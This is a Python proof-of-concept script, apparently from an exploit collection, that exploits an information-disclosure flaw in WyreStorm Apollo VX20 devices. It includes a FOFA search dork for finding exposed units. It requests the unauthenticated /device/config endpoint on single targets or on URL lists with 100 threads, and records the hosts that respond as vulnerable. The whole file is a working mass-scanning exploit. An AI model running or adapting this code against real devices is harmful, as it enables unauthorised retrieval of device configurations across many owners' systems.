# WyreStorm Apollo VX20 信息泄露漏洞
# fofa:icon_hash="-893957814"

import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """,---.  ,---._____     __     .`````-.   .-```````-.  
|   /  |   |\   _\   /  /   /   ,-.  \ / ,```````. \ 
|  |   |  .'.-./ ). /  '   (___/  |   ||/ .-./ )  \| 
|  | _ |  | \ '_ .') .'          .'  / || \ '_ .')|| 
|  _( )_  |(_ (_) _) '       _.-'_.-'  ||(_ (_) _)|| 
\ (_ o._) /  /    \   \    _/_  .'     ||  / .  \ || 
 \ (_,_) /   `-'`-'    \  ( ' )(__..--.||  `-'`"` ||  version:1.0.0
  \     /   /  /   \    \(_{;}_)      |\'._______.'/   author :冷酷小帅
   `---`   '--'     '----'(_,_)-------' '._______.'  
                                                     
"""
    print(test)

def main():
    banner()

    parser = argparse.ArgumentParser(description=" ")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(print(f"Usag:\n\t python3 {sys.argv[0]} -h"))
    
def poc(target):
    payload_url = '/device/config'
    url = target + payload_url
    headers = {
        'Cache-Control':'max-age=0',
        'Sec-Ch-Ua':'"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'Sec-Ch-Ua-Mobile':'?0',
        'Sec-Ch-Ua-Platform':'"Windows"',
        'Upgrade-Insecure-Requests':'1',
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://fofa.info",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Priority": "u=0, i",
        "Connection": "close",
    }
    try:
        res = requests.get(url=url,headers=headers,timeout=5,verify=False).text
        if 'range' in res:
            print(f"[+]该url:{target}存在漏洞")
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+]该url:{target}存在漏洞'+'\n')
        else:
            print(f'[-]该url:{target}不存在漏洞')
    except:
        print(f'[-]该url:{target}存在访问问题，请手动测试')

if __name__ == '__main__':
    main()